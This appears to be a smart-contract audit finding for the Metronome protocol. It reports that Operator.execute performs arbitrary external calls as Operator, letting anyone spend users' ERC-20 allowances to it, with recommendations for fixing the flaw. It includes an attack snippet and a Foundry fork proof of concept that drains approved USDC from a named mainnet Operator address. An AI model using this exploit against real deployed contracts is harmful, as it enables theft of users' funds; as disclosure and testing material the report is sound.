### Title
`Operator.execute` performs arbitrary external calls as the `Operator` identity, allowing theft of any ERC-20 allowance granted to `Operator` - ([File: contracts/Operator.sol](contracts/Operator.sol))

### Summary
`Operator.execute` lets any caller make arbitrary `target.call{value}(callData)` calls with `msg.sender == Operator` [1](#0-0) . This is the exact Dexible bug class: a contract that performs attacker-controlled external calls under its own identity can invoke `transferFrom(victim, attacker, amount)` on any token for which a victim has granted an allowance to `Operator`.

### Finding Description
In the Dexible exploit, `selfSwap` accepted a user-supplied `router`/`routerData` pair and executed it with `msg.sender == Dexible`, so the attacker called `TRU.transferFrom(victim, attacker, victimAllowance)` to drain all tokens the victim had approved to Dexible.

In Metronome, `Operator.execute(Call[] calldata)` iterates over fully attacker-controlled `(target, value, callData)` tuples and executes them via `Address.functionCallWithValue`, so every sub-call is made with `msg.sender == Operator` [2](#0-1) . `Operator` is deployed on every chain (mainnet `0xc06D6347915f6B5e9dBB53Fe17B988b99DbaD360`, Base, Optimism, Hemi, Swell) and is the designated meta-transaction/forwarder for the whole protocol: `SynthContext._msgSender()` treats calls from `Operator` as coming from the transient `MSG_SENDER` slot, which is set to `msg.sender` of `execute` [3](#0-2) [4](#0-3) .

Because `Operator` is the single entry point users are expected to route batched Metronome interactions through (and is a natural `spender` for frontends/aggregators doing `approve` + `execute`), any user allowance to `Operator` is spendable by anyone. Concretely, an attacker calls:

```solidity
operator.execute([Call({
    target: address(token),
    value: 0,
    callData: abi.encodeCall(IERC20.transferFrom, (victim, attacker, allowance))
})]);
```

There is no allowlist on `target`, no selector filtering, and no restriction on which addresses may appear inside `callData`. `nonReentrant` only prevents re-entering `execute` itself and does not constrain the called contract [5](#0-4) . `setMsgSender` correctly stores the *caller's* address, so the transient-sender mechanism cannot be used to impersonate a victim against `SynthContext` contracts — but that mitigation is irrelevant to the ERC-20 layer, where `transferFrom` authenticates on `msg.sender == Operator` and `allowance[victim][Operator]`, both of which the attacker satisfies for free.

### Impact Explanation
Direct theft of user funds: any token amount any user has approved to `Operator` can be transferred to the attacker. In the Dexible incident this same pattern drained ~$154K in TRU from a single victim's allowance. Here the blast radius is every allowance ever granted to `Operator` on every deployed chain, for every token.

### Likelihood Explanation
The call is permissionless, deterministic, and requires no privileged role, oracle manipulation, or flash capital — only a nonzero `allowance(victim, Operator)`. Such allowances are plausible because `Operator` is the canonical batching entry point and tooling frequently issues `approve(operator, …)` before multicall flows (the same precondition that made Dexible exploitable). The attack is fully reproducible on a fork with a mocked or real pre-existing allowance.

### Recommendation
- Disallow calls to token contracts, or require that `target` be whitelisted Metronome contracts (or reject `transferFrom`-shaped calldata where the `from` argument differs from `msg.sender`).
- Alternatively, execute sub-calls via `delegatecall`-less per-call forwarders that preserve `msg.sender` as the EOA, or document and enforce that users must never `approve` `Operator` — though relying on user behavior is what failed for Dexible.

### Proof of Concept
Foundry fork test (mainnet, Operator at `0xc06D6347915f6B5e9dBB53Fe17B988b99DbaD360`):

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

interface IERC20 {
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
}

interface IOperator {
    struct Call { address target; uint256 value; bytes callData; }
    function execute(Call[] calldata) external payable returns (bytes[] memory);
}

contract OperatorArbitraryCallTest is Test {
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IOperator constant OPERATOR = IOperator(0xc06D6347915f6B5e9dBB53Fe17B988b99DbaD360);

    function testDrainAllowance() public {
        address victim = makeAddr("victim");
        address attacker = makeAddr("attacker");

        // Setup: victim holds USDC and approved Operator (e.g. via a batching UI)
        deal(address(USDC), victim, 100_000e6);
        vm.prank(victim);
        USDC.approve(address(OPERATOR), type(uint256).max);

        // Exploit: unprivileged attacker executes an arbitrary call as Operator
        IOperator.Call[] memory calls = new IOperator.Call[](1);
        calls[0] = IOperator.Call({
            target: address(USDC),
            value: 0,
            callData: abi.encodeCall(IERC20.transferFrom, (victim, attacker, 100_000e6))
        });
        vm.prank(attacker);
        OPERATOR.execute(calls);

        assertEq(USDC.balanceOf(attacker), 100_000e6);
        assertEq(USDC.balanceOf(victim), 0);
    }
}
```

### Citations

**File:** contracts/Operator.sol (L20-24)
```text
    modifier setMsgSender() {
        MSG_SENDER_STORAGE.asAddress().tstore(msg.sender);
        _;
        MSG_SENDER_STORAGE.asAddress().tstore(address(0));
    }
```

**File:** contracts/Operator.sol (L34-55)
```text
    function execute(
        Call[] calldata calls_
    ) external payable override nonReentrant setMsgSender returns (bytes[] memory _returnData) {
        uint256 _length = calls_.length;
        _returnData = new bytes[](_length);

        uint256 _sumOfValues;
        Call calldata _call;
        for (uint256 i; i < _length; ) {
            _call = calls_[i];
            uint256 _value = _call.value;
            unchecked {
                _sumOfValues += _value;
            }
            _returnData[i] = _call.target.functionCallWithValue(_call.callData, _value);
            unchecked {
                ++i;
            }
        }

        require(msg.value == _sumOfValues, "value-mismatch");
    }
```

**File:** contracts/utils/SynthContext.sol (L14-24)
```text
    function _msgSender() internal view virtual override returns (address) {
        IPoolRegistry _poolRegistry = poolRegistry();
        if (address(_poolRegistry) != address(0)) {
            IOperator _operator = _poolRegistry.operator();
            if (msg.sender == address(_operator)) {
                return _operator.getActualMsgSender();
            }
        }

        return msg.sender;
    }
```
